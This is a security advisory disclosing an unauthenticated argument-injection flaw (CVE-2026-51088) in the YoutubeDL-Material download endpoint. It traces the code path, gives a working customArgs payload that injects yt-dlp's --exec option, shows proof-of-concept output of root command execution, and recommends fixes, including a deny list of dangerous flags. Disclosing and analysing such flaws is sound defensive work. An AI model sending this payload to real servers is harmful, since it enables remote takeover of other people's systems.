# VDR-021: Unauthenticated Argument Injection to RCE via `customArgs` in Tzahi12345/YoutubeDL-Material

- **Target**: [Tzahi12345/YoutubeDL-Material](https://github.com/Tzahi12345/YoutubeDL-Material)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-88](https://cwe.mitre.org/data/definitions/88.html) - Improper Neutralization of Argument Delimiters (Argument Injection)
- **CVE**: [CVE-2026-51088](https://www.cve.org/CVERecord?id=CVE-2026-51088)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Discovered**: 2026-04-14
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`YoutubeDL-Material` is a self-hosted web front-end for `youtube-dl` / `yt-dlp` (Node.js / Express backend, Angular front-end; Docker deployment is common). The `POST /api/downloadFile` endpoint accepts a `customArgs` field from the request body, splits it on the delimiter `,,`, and passes the resulting array **directly as command-line arguments to the `yt-dlp` binary** with no allowlist. Because `yt-dlp` supports the `--exec` option (run an arbitrary command after download), an attacker who controls the argument list achieves arbitrary command execution on the server. In the default single-user mode the endpoint is **unauthenticated**.

A working proof of concept was executed against the **genuine, unmodified download path** (`downloader.js` argument construction and `youtube-dl.js` `execa` sink) with the real `yt-dlp` binary. The injected command `id` ran server-side and produced `uid=0(root) gid=0(root) groups=0(root)`.

## Affected Component

- **Product**: YoutubeDL-Material
- **Commit**: `28234c0` (2026-03-08, tip of `master`)
- **Vulnerable files**: `backend/app.js`, `backend/downloader.js`, `backend/youtube-dl.js`
- **Endpoint**: `POST /api/downloadFile` (mounted with `optionalJwt`)

### Source -> sink data flow

```js
// backend/app.js:726 - customArgs taken verbatim from the request body
const options = { customArgs: req.body.customArgs, additionalArgs: req.body.additionalArgs, ... };

// backend/downloader.js:476-477 - split on ',,' into an argument array, no filtering
if (customArgs) {
    downloadConfig = customArgs.split(',,');
}

// backend/youtube-dl.js:63 - SINK: the array is spread straight into yt-dlp's argv
const child_process = execa(getYoutubeDLPath(youtubedl_fork), [url, ...args], {maxBuffer: Infinity});
```

`args` (derived from `downloadConfig`) is the attacker-controlled, `,,`-split `customArgs`. It is spread into the `yt-dlp` argument vector with no allowlist of permitted options. `yt-dlp`'s `--exec CMD` option runs `CMD` after the download, so an attacker who can place `--exec` and a command into `args` executes arbitrary OS commands.

### Default-unauthenticated

`POST /api/downloadFile` is registered with `optionalJwt` (`app.js:720`). When `ytdl_multi_user_mode` is disabled (the default), `optionalJwt` calls `next()` unconditionally - no authentication is required.

## Details

This is argument injection (CWE-88): the attacker does not break out of a shell string, but instead injects additional *command-line options* into a trusted program's argument vector. Because `yt-dlp` treats `--exec` as "run this command after download", a `customArgs` value of:

```
--exec,,id > /tmp/PWNED 2>&1 #
```

splits (on `,,`) into `["--exec", "id > /tmp/PWNED 2>&1 #"]`, which becomes `yt-dlp <url> --exec "id > /tmp/PWNED 2>&1 #"`. `yt-dlp` runs the `--exec` command through a shell after downloading; the trailing `#` comments out the media filename `yt-dlp` appends. The command executes in the context of the server process.

## Proof of Concept

The PoC exercises the **genuine argument-construction and sink operations** from the checked-out tree - `customArgs.split(',,')` (`downloader.js:477`) and `execa(yt-dlp, [url, ...args])` (`youtube-dl.js:63`) - using the app's pinned spawn library (`execa@5.1.1`) and the real `yt-dlp` binary, inside an isolated `node:20-slim` container. A local HTTP server provides a file for `yt-dlp` to fetch so that the `--exec` command fires. The Express/DB request plumbing in `app.js`, which only carries `customArgs` to this path without sanitising it (shown at `app.js:726`), is not reproduced.

### Attacker-supplied `customArgs` (POST /api/downloadFile body)

```
--exec,,id > /tmp/PWNED_YTDLM 2>&1 #
```

### Captured transcript (`poc/OUTPUT.txt`)

```
== genuine: backend/downloader.js:476-477 (customArgs.split(',,') -> yt-dlp args, no filtering) ==
476:     if (customArgs) {
477:         downloadConfig = customArgs.split(',,');

== genuine SINK: backend/youtube-dl.js:63 (execa(ytdlp, [url, ...args])) ==
 63:     const child_process = execa(getYoutubeDLPath(youtubedl_fork), [url, ...args], {maxBuffer: Infinity});

== resulting yt-dlp argv [url, ...args]: ["http://127.0.0.1:8000/v.mp4","--exec","id > /tmp/PWNED_YTDLM 2>&1 #"]

== server-side proof: sentinel written by yt-dlp --exec ==
uid=0(root) gid=0(root) groups=0(root)

[PROVEN] argument injection: attacker customArgs -> yt-dlp --exec -> arbitrary command execution
```

The sentinel content - the genuine output of `id` - proves that an attacker-supplied command executed on the server as `root`. The runnable exploit is `poc/exploit.js`, driven by `poc/run.sh`; the full transcript is `poc/OUTPUT.txt`.

## Impact

An unauthenticated remote attacker who can reach the service executes arbitrary OS commands in the context of the Node.js process (observed as `root` in the PoC, which reflects the common Docker deployment): full compromise of confidentiality, integrity and availability, persistence, and internal pivoting. With a default single-user deployment and a single request, the CVSS 3.1 base score is **9.8 (Critical)**, vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

The same unfiltered-argument pattern also applies to the `additionalArgs` field (`downloader.js:534-535`, `utils.injectArgs`) and to subscription `custom_args` (`subscriptions.js:404-410`); all paths that forward user-supplied strings into the `yt-dlp` argv should be remediated together.

## Recommendation

1. **Do not forward arbitrary user arguments to `yt-dlp`.** Expose only a fixed set of safe, application-controlled options (format, quality, output template) and construct the argument vector server-side from validated values.
2. **If custom arguments must be supported, enforce a strict allowlist** of permitted flags and reject dangerous options - at minimum `--exec`, `--exec-before-download`, `--postprocessor-args`, `--downloader`, `--config-location`, `--batch-file`, and `-o`/`--output` - and forbid values that begin with `-`.
3. **Add authentication** to download endpoints rather than relying on `optionalJwt`, and **run the container as an unprivileged user** instead of `root`.

## Status

| Date | Event |
|------|-------|
| 2026-04-14 | Vulnerability reported to MITRE CNA-LR (request 2025339, source-code audit) |
| 2026-07-01 | CVE-2026-51088 assigned by MITRE (RESERVED) |
| 2026-07-02 | Working PoC executed against the genuine download path with real yt-dlp |

## References

- [CWE-88](https://cwe.mitre.org/data/definitions/88.html)
- [Upstream repository](https://github.com/Tzahi12345/YoutubeDL-Material)
- [yt-dlp `--exec` option](https://github.com/yt-dlp/yt-dlp#post-processing-options)
